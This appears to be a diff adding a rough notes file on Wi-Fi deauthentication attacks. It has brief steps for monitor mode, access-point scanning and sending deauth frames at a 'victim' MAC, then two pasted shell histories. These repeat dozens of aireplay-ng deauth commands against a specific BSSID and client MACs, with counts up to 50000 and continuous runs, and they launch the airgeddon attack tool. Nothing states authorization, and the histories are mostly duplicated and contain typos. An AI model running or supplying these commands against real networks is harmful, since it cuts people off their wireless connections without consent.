@@ -1,0 +1,230 @@
+iwconfig, put the wireless adaptor in monitor mode with airmon-ng
+airmon-ng start wlan0
+
+Monitor the available APs with Airodump-ng
+
+airodump-ng waln0mon
+
+connect to the AP for checking BSSID and MAC address of victim
+
+Broadcast deauthenticate users on the AP
+airplay-ng --deauth 1000 -a xx:xx:xx:xx:xx:xx -h xx:xx;xx:xx:xx:xx wlan-mon
+
+1st xx: BSSID of the AP
+2nd xx: MAC of vimctim
+1000: # of deauth frames to send to the AP
+
+
+ Fist mehtod
+
+ 1913  iwconfig
+ 1914  airmon-ng start wlan0
+ 1915  airon-ng check kill
+ 1916  airmon-ng check kill
+ 1917  iwconfig
+ 1918  airodump-ng wlan0mon
+ 1919  aireplay-ng -0 10 -a 00:14:D1:BD:56:ED -c ff:ff:ff:ff:ff:ff wlan0mon
+ 1920  aireplay-ng -0 1000 -a 00:14:D1:BD:56:ED -c ff:ff:ff:ff:ff:ff wlan0mon
+ 1921  airodump-ng wlan0mon
+ 1924  cd tools
+ 1925  cls
+ 1926  ls
+ 1927  cd a
+ 1928  cd airgeddon/
+ 1929  ls
+ 1930  sudo bash airgeddon.sh 
+ 1931  cd tools
+ 1932  cd airgeddon/
+ 1933  l
+ 1934  sl
+ 1935  ls
+ 1936  sudo bash airgeddon.sh 
+ 1937  airdump wlan0mon
+ 1938  air-dump
+ 1939  airodump-ng wlan0mon
+ 1940  airodump-ng -c 11 --bssid 40:01:7A:19:21:C0 
+ 1941  airodump-ng -c 11 --bssid 40:01:7A:19:21:C0 wlan0mon
+ 1942  airodump-ng -c 11 --bssid 18:80:90:E2:15:C0 wlan0mon
+ 1943  airodump-ng -c 1 --bssid 18:80:90:E2:15:C0 wlan0mon
+ 1944  cd tools
+ 1945  cd airgeddon/
+ 1946  ls
+ 1947  sudo bash airgeddon.sh 
+ 1948  cd tools
+ 1949  cd airgeddon/
+ 1950  sudo bash airgeddon.sh 
+ 1951  iwconfig
+ 1952  airodump-ng -c 11 --bssid 00:14:D1:BD:56:ED wlan0mon
+ 1953  aireplay-ng -0 1 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1954  aireplay-ng -0 1000 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1955  aireplay-ng -0 1 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1956  aireplay-ng -0 1000 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1957  aireplay-ng -0 10 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1958  aireplay-ng -0 2 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1959  aireplay-ng -0 3 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1960  aireplay-ng -0 4 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1961  aireplay-ng -0 5 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1962  aireplay-ng -0 6 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1963  aireplay-ng -0 7 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1964  aireplay-ng -0 8 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1965  aireplay-ng -0 9 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1966  aireplay-ng -0 8 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1967  aireplay-ng -0 9 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1968  aireplay-ng -0 10 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1969  aireplay-ng -0 1000 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1970  aireplay-ng -0 20 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1971  aireplay-ng -0 50 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1972  aireplay-ng -0 500 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1973  aireplay-ng -0 900 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1974  aireplay-ng -0 1000 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1975  aireplay-ng -0 2000 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1976  aireplay-ng -0 1500 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1977  aireplay-ng -0 2000 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1978  aireplay-ng -0 3000 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1979  aireplay-ng -0 5000 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1980  aireplay-ng -0 3000 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1981  airodump-ng -c 11 --bssid 00:14:D1:BD:56:ED
+ 1982  airodump-ng -c 11 --bssid 00:14:D1:BD:56:ED wlan0mon
+ 1983  aireplay-ng -0 3000 -a 00:14:D1:BD:56:ED -c 00:CD:FE:26:85:70 wlan0mon
+ 1984  airodump-ng -c 11 --bssid 00:14:D1:BD:56:ED
+ 1985  airodump-ng -c 11 --bssid 00:14:D1:BD:56:ED wlan0mon
+ 1986  aireplay-ng -0 5000 -a 00:14:D1:BD:56:ED -c 00:CD:FE:26:85:70 wlan0mon
+ 1987  aireplay-ng -0 3000 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1988  aireplay-ng -0 50000 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1989  aireplay-ng -0 1000 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1990  aireplay-ng -0 50000 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1991  aireplay-ng -0 1000 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1992  iwconfig
+ 1993  aireplay-ng -0 1000 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1994  iwconfig
+ 1995  airodump-ng -c 11 --bssid 00:14:D1:BD:56:ED
+ 1996  airodump-ng -c 11 --bssid 00:14:D1:BD:56:ED wlan0mon
+ 1997  aireplay-ng -0 1000 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1998  aireplay-ng -0 3000 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1999  iwconfig
+ 2000  cd tools
+ 2001  ls
+ 2002  cd airgeddon/
+ 2003  ls
+ 2004  bash airgeddon.sh 
+ 2005  history
+
+second method
+
+ 1897  airodump-ng wlan0mon -c 11 --bssid 00:14:D1:BD:56:ED
+ 1898  pwd
+ 1899  ls -al
+ 1900  cd tools
+ 1901  mkdir tools
+ 1902  cd tools
+ 1903  git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
+ 1904  cd airgeddon/
+ 1905  ls
+ 1906  ls -al
+ 1907  sudo bash airgeddon.sh 
+ 1908  iwconfig
+ 1909  sudo bash airgeddon.sh 
+ 1910  cd ..
+ 1911  cd 
+ 1912  pwd
+ 1913  iwconfig
+ 1914  airmon-ng start wlan0
+ 1915  airon-ng check kill
+ 1916  airmon-ng check kill
+ 1917  iwconfig
+ 1918  airodump-ng wlan0mon
+ 1919  aireplay-ng -0 10 -a 00:14:D1:BD:56:ED -c ff:ff:ff:ff:ff:ff wlan0mon
+ 1920  aireplay-ng -0 1000 -a 00:14:D1:BD:56:ED -c ff:ff:ff:ff:ff:ff wlan0mon
+ 1921  airodump-ng wlan0mon
+ 1922  history
+ 1923  history 1823
+ 1924  cd tools
+ 1925  cls
+ 1926  ls
+ 1927  cd a
+ 1928  cd airgeddon/
+ 1929  ls
+ 1930  sudo bash airgeddon.sh 
+ 1931  cd tools
+ 1932  cd airgeddon/
+ 1933  l
+ 1934  sl
+ 1935  ls
+ 1936  sudo bash airgeddon.sh 
+ 1937  airdump wlan0mon
+ 1938  air-dump
+ 1939  airodump-ng wlan0mon
+ 1940  airodump-ng -c 11 --bssid 40:01:7A:19:21:C0 
+ 1941  airodump-ng -c 11 --bssid 40:01:7A:19:21:C0 wlan0mon
+ 1942  airodump-ng -c 11 --bssid 18:80:90:E2:15:C0 wlan0mon
+ 1943  airodump-ng -c 1 --bssid 18:80:90:E2:15:C0 wlan0mon
+ 1944  cd tools
+ 1945  cd airgeddon/
+ 1946  ls
+ 1947  sudo bash airgeddon.sh 
+ 1948  cd tools
+ 1949  cd airgeddon/
+ 1950  sudo bash airgeddon.sh 
+ 1951  iwconfig
+ 1952  airodump-ng -c 11 --bssid 00:14:D1:BD:56:ED wlan0mon
+ 1953  aireplay-ng -0 1 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1954  aireplay-ng -0 1000 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1955  aireplay-ng -0 1 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1956  aireplay-ng -0 1000 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1957  aireplay-ng -0 10 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1958  aireplay-ng -0 2 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1959  aireplay-ng -0 3 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1960  aireplay-ng -0 4 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1961  aireplay-ng -0 5 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1962  aireplay-ng -0 6 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1963  aireplay-ng -0 7 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1964  aireplay-ng -0 8 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1965  aireplay-ng -0 9 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1966  aireplay-ng -0 8 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1967  aireplay-ng -0 9 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1968  aireplay-ng -0 10 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1969  aireplay-ng -0 1000 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1970  aireplay-ng -0 20 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1971  aireplay-ng -0 50 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1972  aireplay-ng -0 500 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1973  aireplay-ng -0 900 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1974  aireplay-ng -0 1000 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1975  aireplay-ng -0 2000 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1976  aireplay-ng -0 1500 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1977  aireplay-ng -0 2000 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1978  aireplay-ng -0 3000 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1979  aireplay-ng -0 5000 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1980  aireplay-ng -0 3000 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1981  airodump-ng -c 11 --bssid 00:14:D1:BD:56:ED
+ 1982  airodump-ng -c 11 --bssid 00:14:D1:BD:56:ED wlan0mon
+ 1983  aireplay-ng -0 3000 -a 00:14:D1:BD:56:ED -c 00:CD:FE:26:85:70 wlan0mon
+ 1984  airodump-ng -c 11 --bssid 00:14:D1:BD:56:ED
+ 1985  airodump-ng -c 11 --bssid 00:14:D1:BD:56:ED wlan0mon
+ 1986  aireplay-ng -0 5000 -a 00:14:D1:BD:56:ED -c 00:CD:FE:26:85:70 wlan0mon
+ 1987  aireplay-ng -0 3000 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1988  aireplay-ng -0 50000 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1989  aireplay-ng -0 1000 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1990  aireplay-ng -0 50000 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1991  aireplay-ng -0 1000 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1992  iwconfig
+ 1993  aireplay-ng -0 1000 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1994  iwconfig
+ 1995  airodump-ng -c 11 --bssid 00:14:D1:BD:56:ED
+ 1996  airodump-ng -c 11 --bssid 00:14:D1:BD:56:ED wlan0mon
+ 1997  aireplay-ng -0 1000 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1998  aireplay-ng -0 3000 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 1999  iwconfig
+ 2000  aireplay-ng -0 0 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 2001  iwconfig
+ 2002  aireplay-ng -0 0 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 2003  airodump-ng -c 11 --bssid 00:14:D1:BD:56:ED wlan0mon
+ 2004  aireplay-ng -0 0 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 2005  aireplay-ng -0 1110 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 2006  aireplay-ng -0 1000 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 2007  iwconfig
+ 2008  airodump-ng wlan0mon
+ 2009  aireplay-ng -0 1000 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+ 2010  airodump-ng -c 11 wlan0mon
+ 2011  aireplay-ng -0 1000 -a 00:14:D1:BD:56:ED -c EC:9B:F3:A1:6D:60 wlan0mon
+
+
